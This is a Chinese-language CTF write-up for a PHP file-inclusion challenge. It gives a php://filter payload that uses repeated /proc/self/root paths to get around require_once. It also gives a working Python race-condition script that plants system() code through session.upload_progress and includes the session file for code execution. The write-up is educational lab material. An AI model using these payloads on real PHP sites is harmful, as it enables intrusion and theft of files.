## 题目源码

```php
<?php
highlight_file(__FILE__);
require_once 'flag.php';
if(isset($_GET['file'])) {
  require_once $_GET['file'];
}
```

### 解法一: PHP的truck

`require_once`包含的软链接层数较多时`once`的`hash`匹配会直接失效造成重复包含

[原理链接](https://www.anquanke.com/post/id/213235)

payload

```
?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
```

```
?file=php://filter/convert.base64-encode/resource=/nice/../../proc/self/cwd/flag.php
```

### 解法二: session.upload_progress

python code

```python
import io
import sys
import requests
import threading

host = 'http://a4b822a9-e181-4395-b9be-014a4acc375e.node4.buuoj.cn:81/'
sessid = 'feng'

def upload(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        session.post(
            host,
            data={"PHP_SESSION_UPLOAD_PROGRESS":"<?php system('cat flag.php');echo md5('1');?>"},
            files={"file":('a.txt', f)},
            cookies={'PHPSESSID':sessid}
        )

def read(session):
    while True:
        response = session.get(f'{host}?file=/tmp/sess_{sessid}')
        # print(response.text)
        if 'c4ca4238a0b923820dcc509a6f75849b' not in response.text:
            print('[+++]retry')
        else:
            print(response.text)
            sys.exit(0)


with requests.session() as session:
    t1 = threading.Thread(target=upload, args=(session, ))
    t1.daemon = True
    t1.start()
    read(session)
```



